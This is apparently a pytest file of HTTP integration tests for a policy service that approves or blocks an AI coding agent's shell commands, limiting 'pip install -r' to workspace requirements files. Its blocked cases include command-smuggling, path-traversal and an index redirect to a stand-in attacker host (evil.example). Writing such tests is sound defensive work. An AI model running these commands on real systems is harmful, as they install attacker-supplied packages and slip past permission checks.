"""
HTTP Integration Tests: pip install -r is allowed for a workspace
requirements file only.
"""

import pytest

from tests.http.conftest import check_policy


def _decision(client, base_event, command):
    base_event["event"]["tool_input"]["command"] = command
    response = client.post("/policy/claude-code/PreToolUse", json=base_event)
    assert response.status_code == 200
    return response.json().get("hookSpecificOutput", {}).get("permissionDecision")


@pytest.mark.parametrize(
    "command",
    [
        "pip install -r requirements.txt",
        "pip install -r requirements-dev.txt",
        "pip install -r backend/requirements.txt",
        "pip install -q -r requirements.txt",
    ],
)
def test_pip_install_requirements_allowed(client, base_event, command):
    base_event["bundles"] = ["universal", "python_pip"]
    check_policy(client, base_event, command, "allow")


@pytest.mark.parametrize(
    "command",
    [
        # "requirements.txt" elsewhere in the command does not count
        "pip install -r evil.txt && echo requirements.txt",
        "pip install -r evil.txt requirements.txt",
        "pip install -r /tmp/requirements.txt",
        "pip install -r ../requirements.txt",
        "pip install -r requirements.txt --index-url https://evil.example/simple",
        "pip install -r evil.txt -r requirements.txt",
    ],
)
def test_pip_install_other_requirements_not_allowed(client, base_event, command):
    base_event["bundles"] = ["universal", "python_pip"]
    assert _decision(client, base_event, command) != "allow"
